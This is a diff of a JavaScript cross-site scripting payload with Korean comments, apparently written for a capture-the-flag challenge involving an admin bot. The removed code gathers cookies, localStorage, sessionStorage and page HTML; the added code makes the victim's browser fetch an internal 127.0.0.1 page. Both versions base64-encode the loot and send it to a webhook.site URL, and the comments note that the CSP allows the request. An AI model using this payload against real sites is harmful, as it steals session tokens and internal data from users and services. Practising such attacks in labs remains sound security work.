@@ -1,18 +1,19 @@
-// xss.js
 (async () => {
-    // 1. 가져올 데이터 모으기
-    const data = {
-        cookie: document.cookie, // 1순위 타겟
-        localStorage: JSON.stringify(localStorage), // 2순위
-        sessionStorage: JSON.stringify(sessionStorage), // 3순위
-        // 혹시 모르니 DOM 내용도 일부 가져옴
-        bodyStart: document.body.innerHTML.substring(0, 500) 
-    };
+    try {
+        // 1. 봇의 입장에서 메인 페이지('/') 접속 시도
+        // 봇은 로컬(127.0.0.1) 내부망에 있으므로 접속 가능
+        const response = await fetch('http://127.0.0.1:5000/');
+        
+        // 2. 응답받은 HTML 텍스트 추출
+        const text = await response.text();
 
-    // 2. Base64로 인코딩 (특수문자 깨짐 방지)
-    const payload = btoa(JSON.stringify(data));
+        // 3. HTML 전체를 Base64로 인코딩 (내용이 길고 특수문자가 많으므로)
+        const payload = btoa(text);
 
-    // 3. 내 서버로 전송
-    // fetch는 CSP connect-src * 덕분에 허용됨
-    await fetch(`https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3?data=${payload}`);
+        // 4. 내 웹훅으로 전송
+        await fetch(`https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3?html=${payload}`);
+    } catch (e) {
+        // 에러 나면 에러 메시지라도 전송
+        await fetch(`https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3?error=${btoa(e.toString())}`);
+    }
 })();
